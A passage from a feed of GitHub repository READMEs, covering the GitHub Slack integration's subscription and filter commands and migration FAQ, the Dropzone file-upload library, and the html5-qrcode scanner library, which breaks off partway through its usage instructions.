&lt;p&gt;You can customize your notifications by subscribing to activity that is relevant to your Slack channel, and unsubscribing from activity that is less helpful to your project.&lt;/p&gt; 
&lt;p&gt;Settings are configured with the &lt;code&gt;/github&lt;/code&gt; slash command:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;/github subscribe owner/repo [feature]
/github unsubscribe owner/repo [feature]
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;These are enabled by default, and can be disabled with the &lt;code&gt;/github unsubscribe owner/repo [feature]&lt;/code&gt; command:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;code&gt;issues&lt;/code&gt; - Opened or closed issues&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;pulls&lt;/code&gt; - New or merged pull requests, as well as draft pull requests marked &quot;Ready for Review&quot;&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;commits&lt;/code&gt; - New commits on the default branch (usually &lt;code&gt;master&lt;/code&gt;)&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;releases&lt;/code&gt; - Published releases&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;These are disabled by default, and can be enabled with the &lt;code&gt;/github subscribe owner/repo [feature]&lt;/code&gt; command:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;code&gt;reviews&lt;/code&gt; - Pull request reviews&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;comments&lt;/code&gt; - New comments on issues and pull requests&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;branches&lt;/code&gt; - Created or deleted branches&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;commits:*&lt;/code&gt; - All commits pushed to any branch&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;+label:&quot;your label&quot;&lt;/code&gt; - Filter issues, pull-requests and comments based on their labels.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;You can subscribe or unsubscribe from multiple settings at once. For example, to turn on activity for pull request reviews and comments:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;/github subscribe owner/repo reviews comments
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;And to turn it back off:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;/github unsubscribe owner/repo reviews comments
&lt;/code&gt;&lt;/pre&gt; 
&lt;h4&gt;Filters&lt;/h4&gt; 
&lt;h5&gt;Branch filters for commit&lt;/h5&gt; 
&lt;p&gt;Branch filters allow filtering commit notifications. By default when you subscribe for commits feature, you will get notifications for your default branch (i.e. main). However, you can choose to filter on a specific branch, or a pattern of branches or all branches.&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;code&gt;/github subscribe org/repo commits&lt;/code&gt; for commit notifications from a default branch.&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;/github subscribe org/repo commits:*&lt;/code&gt; for commit notifications across all the branches.&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;/github subscribe org/repo commits:myBranch&lt;/code&gt; for commit notifications from a specific branch.&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;/github subscribe org/repo commits:users/*&lt;/code&gt; for commit notifications from a pattern of branches.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;You can unsubscribe commits feature using `@github unsubscribe org/repo commits.&lt;/p&gt; 
&lt;p&gt;&lt;em&gt;Note&lt;/em&gt;: Previously we you might have used &lt;code&gt;commits:all&lt;/code&gt; to represent all branches. &#39;all&#39; is no longer a reserved keyword. Going forward, you need to use &#39;*&#39; to represent all branches. If you have already configured with &#39;commits:all&#39; previosly, dont worry, it will continue to work until you update the commits configuration.&lt;/p&gt; 
&lt;h5&gt;Label filters for prs and issues&lt;/h5&gt; 
&lt;p&gt;Label filters allow filtering incoming events based on a whitelist of &lt;strong&gt;required&lt;/strong&gt; labels.&lt;/p&gt; 
&lt;p&gt;This is an overview of the event types that are affected by the required-label filter.&lt;/p&gt; 
&lt;p&gt;| Event | Is filtered | | ---------------------- | ----------------- | | Pull | ‚úÖ Yes | | Comment (PR and Issue) | ‚úÖ Yes | | Issue | ‚úÖ Yes | | Review | ‚úÖ Yes | | Commit/Push | ‚ùå No | | Branch | ‚ùå No |&lt;/p&gt; 
&lt;h5&gt;Creating a filter&lt;/h5&gt; 
&lt;p&gt;Create a filter with:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;/github subscribe owner/repo +label:priority:HIGH
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;This creates a required-label filter with the value &lt;code&gt;priority:HIGH&lt;/code&gt;. Incoming events that support filters discarded unless they have that label.&lt;/p&gt; 
&lt;h5&gt;Updating a filter&lt;/h5&gt; 
&lt;p&gt;To update the exiting filter just enter a new one, the old one will be updated. Currently, we only support having one filter. Multiple filters might be supported in the future.&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;/github subscribe owner/repo +label:&quot;teams/designers&quot;
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Now the exiting filter &lt;code&gt;priority:HIGH&lt;/code&gt; has been replaced by &lt;code&gt;teams/designers&lt;/code&gt;.&lt;/p&gt; 
&lt;h5&gt;Removing filters&lt;/h5&gt; 
&lt;p&gt;Removing a filter is available via &lt;code&gt;unsubscribe&lt;/code&gt;&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;/github unsubscribe owner/repo +label:teams/designers
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;This removes the &lt;code&gt;priority:HIGH&lt;/code&gt; filter.&lt;/p&gt; 
&lt;h5&gt;Listing filters&lt;/h5&gt; 
&lt;p&gt;To see the currently active filters use&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;/github subscribe list features
&lt;/code&gt;&lt;/pre&gt; 
&lt;h5&gt;Valid filters&lt;/h5&gt; 
&lt;p&gt;It is common to have certain special characters in labels. Therefore we added support for the most common special characters for label filters. Here a few examples:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;code&gt;label:priority:HIGH&lt;/code&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;label:teams/designers&lt;/code&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;label:&quot;DO NOT MERGE&quot;&lt;/code&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;label:&quot;very important&quot;&lt;/code&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;label:&quot;:construction: WIP&quot;&lt;/code&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;Most labels will work seamlessly, this includes all emojis that slack and github provide out of the box. However in the following rare circumstances you might run into difficulties:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;Multibyte characters that are not encoded as &lt;code&gt;:foo:&lt;/code&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;,&lt;/code&gt; is reserved&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Moving away from the legacy workspace app model in Slack&lt;/h3&gt; 
&lt;p&gt;You need to update your GitHub app if you have installed the GitHub Slack integration in your workspace before &lt;strong&gt;April 09, 2021&lt;/strong&gt;.&lt;/p&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;h4&gt;1. Why do I need to upgrade?&lt;/h4&gt; 
&lt;p&gt;Previous GitHub integration for Slack is built on top of Slack&#39;s &lt;a href=&quot;https://api.slack.com/legacy/workspace-apps&quot;&gt;workspace apps&lt;/a&gt;. Unfortunately, Slack deprecated the workspace apps. More details about the announcement can be found on the &lt;a href=&quot;https://api.slack.com/changelog/2021-03-workspace-apps-to-retire-in-august-2021&quot;&gt;Slack documentation&lt;/a&gt;.&lt;/p&gt; 
&lt;p&gt;Our workspace app relies on Slack APIs that are now deprecated and will be retired soon. We now need to move to Slack&#39;s newly supported bot app framework.&lt;/p&gt; 
&lt;h4&gt;2. How do I upgrade?&lt;/h4&gt; 
&lt;p&gt;You can upgrade the GitHub app in two ways.&lt;/p&gt; 
&lt;ol&gt; 
 &lt;li&gt;By installing the new GitHub app from the Marketplace or click on the install link &lt;a href=&quot;https://slack.github.com/&quot;&gt;here&lt;/a&gt;. We will automatically detect and update the old app and migrate your subscriptions.&lt;/li&gt; 
 &lt;li&gt;If you are on the old app, you will start receiving alerts in your channels to update. The old app will be upgraded, and you will get a confirmation message once the upgrade is completed. Also, a message will be posted in all your channels once all your subscriptions are successfully migrated.&lt;/li&gt; 
&lt;/ol&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;h4&gt;3. What changes after the upgrade?&lt;/h4&gt; 
&lt;p&gt;No change in the way our GitHub app for Slack works. Once you upgrade, we will migrate all your subscriptions and replace the old legacy GitHub app.&lt;/p&gt; 
&lt;p&gt;In terms of notifications, if you have subscriptions configured only in public Slack channels, everything works seamlessly after the upgrade. However, if you are using GitHub app in private channels, you need to invite the GitHub app to the channel for your subscriptions to work again.&lt;/p&gt; 
&lt;p&gt;Once you upgrade, GitHub will send a message to invite the bot again if you have any private channels.&lt;/p&gt; 
&lt;p&gt;Along with this upgrade, we have also made few changes to the app.&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;Enhanced security for &lt;strong&gt;sign in&lt;/strong&gt; experience: As part of this upgrade, we have also updated the sign in flow to have a multistep process with verification code. This is necessary to make sign in to GitHub from Slack more secure.&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;Introduced Branch filters for &lt;strong&gt;commit notifications&lt;/strong&gt;: Commit notifications now support filtering based on branches. You can choose to filter on a specific branch, or a pattern of branches or all branches. You can find more details &lt;a href=&quot;https://github.com/integrations/slack#configuration&quot;&gt;here&lt;/a&gt;.&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;Removed &lt;strong&gt;deploy command and notification&lt;/strong&gt; support: Today, the functionality provided by deploy command is very limited and doesn&#39;t address all the scenarios. We are removing deploy command and notifications support as part of this version. We want to relook at the scenarios and build a more holistic experience that customers need.&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Public&lt;/strong&gt; feature i.e. repo notification is always enabled: Going forward, you will not see &#39;Public&#39; in the subscribe features list. However, whenever a change happens to the repo it will be notified in the channels where it is subscribed and user will not have option to disable &#39;public&#39; notifications. Repo is a core entity and when some change happens to the repo that user choose to subscribe, it is the basic info that has to be notified to the user.&lt;/p&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;4. When do I need to migrate by?&lt;/h4&gt; 
&lt;p&gt;All your workspaces need to be upgraded by &lt;strong&gt;July 15, 2021&lt;/strong&gt; after which the old version of the app will stop working. If you have any questions or concerns, please reach out to us by logging an issue &lt;a href=&quot;https://github.com/integrations/slack/issues/new/choose&quot;&gt;here&lt;/a&gt;.&lt;/p&gt; 
&lt;h2&gt;Questions? Need help?&lt;/h2&gt; 
&lt;p&gt;Please fill out GitHub&#39;s &lt;a href=&quot;https://github.com/contact?form%5Bsubject%5D=Re:+GitHub%2BSlack+Integration&quot;&gt;Support form&lt;/a&gt; and your request will be routed to the right team at GitHub.&lt;/p&gt; 
&lt;h2&gt;~~Contributing~~&lt;/h2&gt; 
&lt;p&gt;We are currently making platform changes and &lt;strong&gt;not&lt;/strong&gt; accepting any contributions to this app. You can raise a feature request from &lt;a href=&quot;https://github.com/integrations/slack/issues/new/choose&quot;&gt;here&lt;/a&gt;&lt;/p&gt; 
&lt;h2&gt;License&lt;/h2&gt; 
&lt;p&gt;The project is available as open source under the terms of the &lt;a href=&quot;https://raw.githubusercontent.com/integrations/slack/master/LICENSE&quot;&gt;MIT License&lt;/a&gt;.&lt;/p&gt; 
&lt;p&gt;When using the GitHub logos, be sure to follow the &lt;a href=&quot;https://github.com/logos&quot;&gt;GitHub logo guidelines&lt;/a&gt;.&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>dropzone/dropzone</title>
      <link>https://github.com/dropzone/dropzone</link>
      <description>&lt;p&gt;Dropzone is an easy to use drag&#39;n&#39;drop library. It supports image previews and shows nice progress bars.&lt;/p&gt;&lt;hr&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/dropzone/dropzone/actions/workflows/test-and-release.yml&quot;&gt;&lt;img src=&quot;https://github.com/dropzone/dropzone/actions/workflows/test-and-release.yml/badge.svg&quot; alt=&quot;Test and Release&quot;&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Dropzone is a JavaScript library that turns any HTML element into a dropzone. This means that a user can drag and drop a file onto it, and Dropzone will display file previews and upload progress, and handle the upload for you via XHR.&lt;/p&gt; 
&lt;p&gt;It&#39;s fully configurable and can be styled according to your needs.&lt;/p&gt; 
&lt;h2&gt;Quickstart&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href=&quot;https://dropzone.gitbook.io/dropzone/&quot;&gt;üìö Full documentation&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://github.com/dropzone/dropzone/releases/latest/download/dist.zip&quot;&gt;üíæ Download link&lt;/a&gt; containing JavaScript UMD modules and CSS files (full and minimised)&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://github.com/dropzone/dropzone/blob/main/src/options.js&quot;&gt;‚öôÔ∏è &lt;code&gt;src/options.js&lt;/code&gt;&lt;/a&gt; for all available options&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;&amp;nbsp;&lt;/p&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;p&gt;&amp;nbsp;&lt;/p&gt; 
&lt;h2&gt;Community&lt;/h2&gt; 
&lt;p&gt;If you need support please use the &lt;a href=&quot;https://github.com/dropzone/dropzone/discussions&quot;&gt;discussions section&lt;/a&gt; or &lt;a href=&quot;https://stackoverflow.com/questions/tagged/dropzone.js&quot;&gt;stackoverflow&lt;/a&gt; with the &lt;code&gt;dropzone.js&lt;/code&gt; tag and &lt;strong&gt;not&lt;/strong&gt; the GitHub issues tracker. Only post an issue here if you think you discovered a bug.&lt;/p&gt; 
&lt;p&gt;If you have a feature request or want to discuss something, please use the &lt;a href=&quot;https://github.com/dropzone/dropzone/discussions&quot;&gt;discussions&lt;/a&gt; as well.&lt;/p&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;‚ö†Ô∏è &lt;strong&gt;Please read the &lt;a href=&quot;https://raw.githubusercontent.com/dropzone/dropzone/main/CONTRIBUTING.md&quot;&gt;contributing guidelines&lt;/a&gt; before you start working on Dropzone!&lt;/strong&gt;&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;h2&gt;Main features&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;Beautiful by default&lt;/li&gt; 
 &lt;li&gt;Image thumbnail previews. Simply register the callback &lt;code&gt;thumbnail(file, data)&lt;/code&gt; and display the image wherever you like&lt;/li&gt; 
 &lt;li&gt;Retina enabled&lt;/li&gt; 
 &lt;li&gt;Multiple files and synchronous uploads&lt;/li&gt; 
 &lt;li&gt;Progress updates&lt;/li&gt; 
 &lt;li&gt;Support for large files&lt;/li&gt; 
 &lt;li&gt;Complete theming. The look and feel of Dropzone is just the default theme. You can define everything yourself by overwriting the default event listeners.&lt;/li&gt; 
 &lt;li&gt;Browser image resizing (resize the images before you upload them to your server)&lt;/li&gt; 
 &lt;li&gt;Well tested&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h1&gt;MIT License&lt;/h1&gt; 
&lt;p&gt;See LICENSE file&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>mebjas/html5-qrcode</title>
      <link>https://github.com/mebjas/html5-qrcode</link>
      <description>&lt;p&gt;A cross platform HTML5 QR code reader&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Html5-QRCode&lt;/h1&gt; 
&lt;h2&gt;(supports barcodes now :))&lt;/h2&gt; 
&lt;p&gt;A cross-platform HTML5 QR code &amp;amp; barcode reader.&lt;/p&gt; 
&lt;p&gt;Use this lightweight library to easily / quickly integrate QR code, bar code, and other common code scanning capabilities to your web application.&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;Supports easy scanning using an integrated webcam or camera in smartphones (Android / IOS).&lt;/li&gt; 
 &lt;li&gt;Supports scanning codes from files or default cameras on smartphones.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;
   &lt;!-- raw HTML omitted --&gt;Recently Added
   &lt;!-- raw HTML omitted --&gt;&lt;/strong&gt; Supports bar code scanning in various formats.&lt;/li&gt; 
 &lt;li&gt;Supports two kind of APIs 
  &lt;ul&gt; 
   &lt;li&gt;&lt;code&gt;Html5QrcodeScanner&lt;/code&gt; - End-to-end scanner with UI, integrate with less than ten lines of code.&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;Html5Qrcode&lt;/code&gt; - Powerful set of APIs you can use to build your UI without worrying about camera setup, handling permissions, reading codes, etc.&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;Support for scanning local files on the device is a new addition and helpful for the web browser which does not support inline web-camera access in smartphones. &lt;strong&gt;Note:&lt;/strong&gt; This doesn&#39;t upload files to any server - everything is done locally.&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;p&gt;&lt;a href=&quot;https://travis-ci.org/mebjas/html5-qrcode&quot;&gt;&lt;img src=&quot;https://travis-ci.org/mebjas/html5-qrcode.svg?branch=master&quot; alt=&quot;Build Status&quot;&gt;&lt;/a&gt; &lt;a href=&quot;https://github.com/mebjas/html5-qrcode/issues&quot;&gt;&lt;img src=&quot;https://img.shields.io/github/issues/mebjas/html5-qrcode&quot; alt=&quot;GitHub issues&quot;&gt;&lt;/a&gt; &lt;a href=&quot;https://github.com/mebjas/html5-qrcode/releases&quot;&gt;&lt;img src=&quot;https://img.shields.io/github/v/tag/mebjas/html5-qrcode&quot; alt=&quot;GitHub tag (latest by date)&quot;&gt;&lt;/a&gt; &lt;img src=&quot;https://img.shields.io/github/license/mebjas/html5-qrcode&quot; alt=&quot;GitHub&quot;&gt;&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://www.npmjs.com/package/html5-qrcode&quot;&gt;&lt;img src=&quot;https://nodei.co/npm/html5-qrcode.png&quot; alt=&quot;npm&quot;&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;| 
 &lt;!-- raw HTML omitted --&gt; | 
 &lt;!-- raw HTML omitted --&gt;| | -- | -- | | &lt;em&gt;Figure: Running on Android, Pixel 3&lt;/em&gt; | &lt;em&gt;Figure: Running on Android, Pixel 4, &lt;strong&gt;Scanning different types of codes&lt;/strong&gt;&lt;/em&gt; |&lt;/p&gt; 
&lt;h2&gt;Supported platforms&lt;/h2&gt; 
&lt;p&gt;We are working continuously on adding support for more and more platforms. If you find a platform or a browser where the library is not working, please feel free to file an issue. Check the &lt;a href=&quot;https://blog.minhazav.dev/research/html5-qrcode.html&quot;&gt;demo link&lt;/a&gt; to test it out.&lt;/p&gt; 
&lt;h5&gt;Legends&lt;/h5&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;img src=&quot;https://raw.githubusercontent.com/mebjas/html5-qrcode/master/assets/done.png&quot; alt=&quot;&quot;&gt; Means full support - inline webcam and file based&lt;/li&gt; 
 &lt;li&gt;&lt;img src=&quot;https://raw.githubusercontent.com/mebjas/html5-qrcode/master/assets/partial.png&quot; alt=&quot;&quot;&gt; Means partial support - only file based, webcam in progress&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;PC / Mac&lt;/h3&gt; 
&lt;p&gt;| 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;Firefox | 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;Chrome | 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;Safari | 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;Opera | 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; Edge | --------- | --------- | --------- | --------- | ------- | |&lt;img src=&quot;https://raw.githubusercontent.com/mebjas/html5-qrcode/master/assets/done.png&quot; alt=&quot;&quot;&gt;| &lt;img src=&quot;https://raw.githubusercontent.com/mebjas/html5-qrcode/master/assets/done.png&quot; alt=&quot;&quot;&gt;| &lt;img src=&quot;https://raw.githubusercontent.com/mebjas/html5-qrcode/master/assets/done.png&quot; alt=&quot;&quot;&gt;| &lt;img src=&quot;https://raw.githubusercontent.com/mebjas/html5-qrcode/master/assets/done.png&quot; alt=&quot;&quot;&gt; | &lt;img src=&quot;https://raw.githubusercontent.com/mebjas/html5-qrcode/master/assets/done.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt; 
&lt;h3&gt;Android&lt;/h3&gt; 
&lt;p&gt;| 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;Chrome | 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;Firefox | 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; Edge | 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;Opera | 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; Opera Mini | 
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt; UC | --------- | --------- | --------- | --------- | --------- | --------- | |&lt;img src=&quot;https://raw.githubusercontent.com/mebjas/html5-qrcode/master/assets/done.png&quot; alt=&quot;&quot;&gt;| &lt;img src=&quot;https://raw.githubusercontent.com/mebjas/html5-qrcode/master/assets/done.png&quot; alt=&quot;&quot;&gt;| &lt;img src=&quot;https://raw.githubusercontent.com/mebjas/html5-qrcode/master/assets/done.png&quot; alt=&quot;&quot;&gt;| &lt;img src=&quot;https://raw.githubusercontent.com/mebjas/html5-qrcode/master/assets/done.png&quot; alt=&quot;&quot;&gt;| &lt;img src=&quot;https://raw.githubusercontent.com/mebjas/html5-qrcode/master/assets/partial.png&quot; alt=&quot;&quot;&gt; | &lt;img src=&quot;https://raw.githubusercontent.com/mebjas/html5-qrcode/master/assets/partial.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt; 
&lt;h3&gt;IOS&lt;/h3&gt; 
&lt;p&gt;| 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;Safari | 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;Chrome | 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;Firefox | 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; Edge | --------- | --------- | --------- | --------- | |&lt;img src=&quot;https://raw.githubusercontent.com/mebjas/html5-qrcode/master/assets/done.png&quot; alt=&quot;&quot;&gt;| &lt;img src=&quot;https://raw.githubusercontent.com/mebjas/html5-qrcode/master/assets/partial.png&quot; alt=&quot;&quot;&gt;| &lt;img src=&quot;https://raw.githubusercontent.com/mebjas/html5-qrcode/master/assets/partial.png&quot; alt=&quot;&quot;&gt;| &lt;img src=&quot;https://raw.githubusercontent.com/mebjas/html5-qrcode/master/assets/partial.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;Apparently, Webkit for IOS is used by Chrome, Firefox, and other browsers in IOS and they do not have webcam permissions yet. There is an ongoing issue on fixing the support for iOS - &lt;a href=&quot;https://github.com/mebjas/html5-qrcode/issues/14&quot;&gt;issue/14&lt;/a&gt;&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;h3&gt;Framework support&lt;/h3&gt; 
&lt;p&gt;The library can be easily used with several other frameworks, I have been adding examples for a few of them and would continue to add more.&lt;/p&gt; 
&lt;p&gt;|
 &lt;!-- raw HTML omitted --&gt;| 
 &lt;!-- raw HTML omitted --&gt;|
 &lt;!-- raw HTML omitted --&gt; | 
 &lt;!-- raw HTML omitted --&gt; | -------- | -------- | -------- | -------- | | &lt;a href=&quot;https://raw.githubusercontent.com/mebjas/html5-qrcode/master/examples/html5&quot;&gt;Html5&lt;/a&gt; | &lt;a href=&quot;https://raw.githubusercontent.com/mebjas/html5-qrcode/master/examples/vuejs&quot;&gt;VueJs&lt;/a&gt; | &lt;a href=&quot;https://raw.githubusercontent.com/mebjas/html5-qrcode/master/examples/electron&quot;&gt;ElectronJs&lt;/a&gt; | &lt;a href=&quot;https://raw.githubusercontent.com/mebjas/html5-qrcode/master/examples/react&quot;&gt;React&lt;/a&gt;&lt;/p&gt; 
&lt;h3&gt;Supported Code formats&lt;/h3&gt; 
&lt;p&gt;Code scanning is dependent on &lt;a href=&quot;https://github.com/zxing-js/library&quot;&gt;Zxing-js&lt;/a&gt; library. We will be working on top of it to add support for more types of code scanning. If you feel a certain type of code would be helpful to have, please file a feature request.&lt;/p&gt; 
&lt;p&gt;| Code | Example | | ---- | ----- | | QR Code | 
 &lt;!-- raw HTML omitted --&gt; | | AZTEC | 
 &lt;!-- raw HTML omitted --&gt; | | CODE_39| 
 &lt;!-- raw HTML omitted --&gt; | | CODE_93| 
 &lt;!-- raw HTML omitted --&gt;| | CODE_128| 
 &lt;!-- raw HTML omitted --&gt;| | MAXICODE| 
 &lt;!-- raw HTML omitted --&gt; | | ITF| 
 &lt;!-- raw HTML omitted --&gt;| | EAN_13|
 &lt;!-- raw HTML omitted --&gt; | | EAN_8| 
 &lt;!-- raw HTML omitted --&gt;| | PDF_417| 
 &lt;!-- raw HTML omitted --&gt;| | RSS_14| 
 &lt;!-- raw HTML omitted --&gt;| | RSS_EXPANDED|
 &lt;!-- raw HTML omitted --&gt; | | UPC_A| 
 &lt;!-- raw HTML omitted --&gt;| | UPC_E| 
 &lt;!-- raw HTML omitted --&gt;| | DATA_MATRIX|
 &lt;!-- raw HTML omitted --&gt; |&lt;/p&gt; 
&lt;h2&gt;Description - &lt;a href=&quot;https://blog.minhazav.dev/research/html5-qrcode.html&quot;&gt;View Demo&lt;/a&gt;&lt;/h2&gt; 
&lt;p&gt;This is a cross-platform Javascript library to integrate QR code, bar codes &amp;amp; a few other types of code scanning capabilities to your applications running on HTML5 compatible browser.&lt;/p&gt; 
&lt;p&gt;Supports:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;Querying camera on the device (with user permissions)&lt;/li&gt; 
 &lt;li&gt;Rendering live camera feed, with easy to use user interface for scanning&lt;/li&gt; 
 &lt;li&gt;Supports scanning a different kind of QR codes, bar codes and other formats&lt;/li&gt; 
 &lt;li&gt;Supports selecting image files from the device for scanning codes&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;How to use?&lt;/h2&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;For full information &lt;a href=&quot;https://blog.minhazav.dev/HTML5-QR-Code-scanning-launched-v1.0.1/&quot;&gt;read this article&lt;/a&gt;.&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;p&gt;Download the script from &lt;a href=&quot;https://github.com/mebjas/html5-qrcode/releases&quot;&gt;release page&lt;/a&gt; or &lt;code&gt;npm&lt;/code&gt; with:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;npm i html5-qrcode
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Add an element you want to use as a placeholder for QR Code scanner&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;&amp;lt;div id=&quot;reader&quot; width=&quot;600px&quot;&amp;gt;&amp;lt;/div&amp;gt;
&lt;/code&gt;&lt;/pre&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;Ideally do not set the height of this container as the height should depend on the height of the video feed from the camera. The library would honor the existing width, otherwise apply the default width. The height is derived from the aspect ratio of the video feed.&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;p&gt;Add &lt;code&gt;minified/html5-qrcode.min.js&lt;/code&gt; in your web page.&lt;/p&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;I would recommend using the minified version as it&#39;s transformed to standard javascript. The &lt;code&gt;html5-qrcode.js&lt;/code&gt; is written with ECMAScript and may not be supported in the older version of the browsers. I wrote in this as it&#39;s easier to maintain!&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;&amp;lt;script src=&quot;./minified/html5-qrcode.js&quot;&amp;gt;&amp;lt;/script&amp;gt;
&amp;lt;!--
  Or use directly from Github

&amp;lt;script src=&quot;https://raw.githubusercontent.com/mebjas/html5-qrcode/master/minified/html5-qrcode.min.js&quot;&amp;gt;&amp;lt;/script&amp;gt;
--&amp;gt;
&lt;/code&gt;&lt;/pre&gt; 
&lt;h3&gt;Easy Mode - With end to end scanner user interface&lt;/h3&gt; 
&lt;p&gt;&lt;code&gt;Html5QrcodeScanner&lt;/code&gt; lets you implement an end to end scanner with few lines of code with the default user interface which allows scanning using the camera or selecting an image from the file system.&lt;/p&gt; 
&lt;p&gt;You can setup the scanner as follows:&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;function onScanSuccess(qrMessage) {
	// handle the scanned code as you like, for example:
	console.log(`QR matched = ${qrMessage}`);
}

function onScanFailure(error) {
	// handle scan failure, usually better to ignore and keep scanning.
  // for example:
	console.warn(`QR error = ${error}`);
}

let html5QrcodeScanner = new Html5QrcodeScanner(
	&quot;reader&quot;, { fps: 10, qrbox: 250 }, /* verbose= */ false);
html5QrcodeScanner.render(onScanSuccess, onScanFailure);
&lt;/code&gt;&lt;/pre&gt; 
&lt;h3&gt;Pro Mode - if you want to implement your own user interface&lt;/h3&gt; 
